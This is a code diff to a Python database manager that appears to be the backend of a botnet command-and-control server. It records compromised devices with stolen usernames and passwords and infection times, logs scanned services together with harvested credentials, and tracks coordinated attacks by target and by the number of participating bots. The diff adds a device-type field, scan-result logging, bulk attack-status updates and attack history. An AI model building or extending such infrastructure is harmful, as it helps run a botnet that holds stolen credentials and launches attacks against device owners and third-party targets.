@@ -18,8 +18,7 @@ class DatabaseManager:
         """Initialize database tables"""
         conn = self.get_connection()
         cursor = conn.cursor()
-        
-        # Table for compromised devices
+          # Table for compromised devices
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS devices (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -28,7 +27,8 @@ class DatabaseManager:
                 password TEXT,
                 status TEXT DEFAULT 'offline',
                 last_seen TIMESTAMP,
-                infection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                infection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                device_type TEXT DEFAULT 'unknown'
             )
         ''')
         
@@ -57,9 +57,10 @@ class DatabaseManager:
                 attack_type TEXT,
                 target TEXT,
                 start_time TIMESTAMP,
-                participating_bots INTEGER,                status TEXT
-            )
-        ''')
+                participating_bots INTEGER,
+                status TEXT
+            )        ''')
+        
         conn.commit()
         conn.close()
         logging.info("Database initialized successfully")
@@ -77,18 +78,18 @@ class DatabaseManager:
             logging.error(f"Database connection error: {e}")
             raise
     
-    def register_device(self, ip, username, password):
+    def register_device(self, ip, username, password, device_type='unknown'):
         """Register a compromised device"""
         with self.db_lock:
             conn = self.get_connection()
             cursor = conn.cursor()
             try:
                 cursor.execute('''
-                    INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen)
-                    VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)
-                ''', (ip, username, password))
+                    INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen, device_type)
+                    VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP, ?)
+                ''', (ip, username, password, device_type))
                 conn.commit()
-                logging.info(f"Database: Registered device {ip} with '{username}':'{password}'")
+                logging.info(f"Database: Registered device {ip} with '{username}':'{password}', type: {device_type}")
                 return True
             except Exception as e:
                 logging.error(f"Database error registering device {ip}: {e}")
@@ -115,9 +116,11 @@ class DatabaseManager:
         devices = cursor.fetchall()
         conn.close()
         
-        # Convert tuples to dictionaries
-        columns = ['id', 'ip', 'username', 'password', 'status', 'last_seen', 'infection_time']
-        return [dict(zip(columns, device)) for device in devices]
+        # Convert to list of dictionaries
+        result = []
+        for device in devices:
+            result.append(dict(device))
+        return result
     
     def get_online_devices(self):
         """Get only online devices"""
@@ -127,9 +130,11 @@ class DatabaseManager:
         devices = cursor.fetchall()
         conn.close()
         
-        # Convert tuples to dictionaries
-        columns = ['id', 'ip', 'username', 'password', 'status', 'last_seen', 'infection_time']
-        return [dict(zip(columns, device)) for device in devices]
+        # Convert to list of dictionaries
+        result = []
+        for device in devices:
+            result.append(dict(device))
+        return result
     
     def log_attack(self, attack_type, target, participating_bots):
         """Log attack information"""
@@ -151,12 +156,13 @@ class DatabaseManager:
             SELECT ip, port, service, MAX(timestamp) as timestamp
             FROM attack_logs
             WHERE port IS NOT NULL
-            GROUP BY ip
+            GROUP BY ip, port, service
             ORDER BY timestamp DESC
             LIMIT ?
         ''', (limit,))
-        results = [{'ip': row[0], 'port': row[1], 'service': row[2], 'timestamp': row[3]} 
-                  for row in cursor.fetchall()]
+        results = []
+        for row in cursor.fetchall():
+            results.append(dict(row))
         conn.close()
         return results
         
@@ -171,6 +177,80 @@ class DatabaseManager:
         if not device:
             return None
             
-        # Convert tuple to dictionary
-        columns = ['id', 'ip', 'username', 'password', 'status', 'last_seen', 'infection_time']
-        return {columns[i]: device[i] for i in range(len(columns))}
+        return dict(device)
+        
+    def add_scan_result(self, ip, port, service, credentials=None):
+        """Add scan result to the database"""
+        with self.db_lock:
+            conn = self.get_connection()
+            cursor = conn.cursor()
+            try:
+                cursor.execute('''
+                    INSERT INTO attack_logs (ip, port, service, credentials, timestamp)
+                    VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
+                ''', (ip, port, service, credentials))
+                conn.commit()
+                logging.info(f"Database: Added scan result for {ip}:{port} ({service})")
+                return True
+            except Exception as e:
+                logging.error(f"Database error adding scan result for {ip}:{port}: {e}")
+                return False
+            finally:
+                conn.close()
+    
+    def update_attack_status(self, attack_id=None, bot_ip=None, status='stopped'):
+        """Update attack status in the database"""
+        with self.db_lock:
+            conn = self.get_connection()
+            cursor = conn.cursor()
+            try:
+                if attack_id:
+                    # Update specific attack by ID
+                    cursor.execute('''
+                        UPDATE attack_logs 
+                        SET status = ? 
+                        WHERE id = ?
+                    ''', (status, attack_id))
+                elif bot_ip:
+                    # Update all active attacks from a specific bot IP
+                    cursor.execute('''
+                        UPDATE attack_logs 
+                        SET status = ? 
+                        WHERE ip = ? AND status = 'active'
+                    ''', (status, bot_ip))
+                else:
+                    # Update all active attacks
+                    cursor.execute('''
+                        UPDATE attack_logs 
+                        SET status = ? 
+                        WHERE status = 'active'
+                    ''', (status,))
+                
+                conn.commit()
+                
+                # Get count of updated rows
+                updated_count = cursor.rowcount
+                logging.info(f"Updated {updated_count} attack records to status '{status}'")
+                return updated_count
+                
+            except Exception as e:
+                logging.error(f"Database error updating attack status: {e}")
+                return 0
+            finally:
+                conn.close()
+                
+    def get_attack_history(self, limit=20):
+        """Get attack history"""
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT * FROM attack_logs
+            WHERE attack_type IS NOT NULL
+            ORDER BY start_time DESC
+            LIMIT ?
+        ''', (limit,))
+        results = []
+        for row in cursor.fetchall():
+            results.append(dict(row))
+        conn.close()
+        return results
